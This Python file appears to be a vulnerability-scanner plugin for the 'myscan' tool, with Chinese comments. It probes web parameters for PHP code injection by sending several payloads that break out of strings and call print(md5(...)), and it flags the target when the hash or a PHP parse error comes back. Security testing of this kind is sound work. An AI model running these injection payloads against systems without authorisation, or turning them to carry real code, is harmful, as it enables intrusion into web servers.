#!/usr/bin/env python3
# @Time    : 2020-03-11
# @Author  : caicai
# @File    : myscan_phpcode_inject.py


from myscan.lib.parse.dictdata_parser import dictdata_parser  # 写了一些操作dictdata的方法的类
from myscan.lib.parse.response_parser import response_parser  ##写了一些操作resonse的方法的类
from myscan.lib.helper.request import request  # 修改了requests.request请求的库，建议使用此库，会在redis计数
from myscan.lib.core.common import get_random_num, getmd5
import re


class POC():
    def __init__(self, workdata):
        self.dictdata = workdata.get("dictdata")  # python的dict数据，详情请看docs/开发指南Example dict数据示例
        # scheme的poc不同perfoler和perfile,没有workdata没有data字段,所以无self.url
        self.result = []  # 此result保存dict数据，dict需包含name,url,level,detail字段，detail字段值必须为dict。如下self.result.append代码
        self.name = "phpcode_inject"
        self.vulmsg = "PHP命令注入"
        self.level = 2  # 0:Low  1:Medium 2:High

    def verify(self):
        if self.dictdata.get("url").get("extension")[:3].lower() not in ["php", ""]:
            return

        parser = dictdata_parser(self.dictdata)
        params = self.dictdata.get("request").get("params").get("params_url") + \
                 self.dictdata.get("request").get("params").get("params_body")
        num1 = get_random_num(8)
        num1_md5 = getmd5(num1)
        regx = 'Parse error: syntax error,.*?\sin\s'
        payloads = (
            "print(md5({}));",
            " print(md5({}));",
            ";print(md5({}));",
            "';print(md5({}));$a='",
            "\";print(md5({}));$a=\"",
            "${{@print(md5({}))}}",
            "${{@print(md5({}))}}\\",
            "'.print(md5({})).'"
        )
        if params:
            for param in params:
                for payload in payloads:
                    method = "a" if payload[0] == "p" else "w"
                    payload=payload.format(num1)
                    req = parser.getreqfromparam(param, text=payload, method=method)
                    r = request(**req)
                    if r is not None:
                        if num1_md5 in r.text:
                            self.save(r, param, payload)
                            break
                        elif re.search(regx, r.text, re.I | re.S):
                            self.save(r, param, "search rule: " + regx)
                            break

    def save(self, r, param, payload):
        parser_ = response_parser(r)
        self.result.append({
            "name": self.name,
            "url": parser_.geturl(),
            "level": self.level,  # 0:Low  1:Medium 2:High
            "detail": {
                "vulmsg": self.vulmsg,
                "param": param.get("name"),
                "payload": payload,
                "request": parser_.getrequestraw(),
                "response": parser_.getresponseraw()
            }
        })
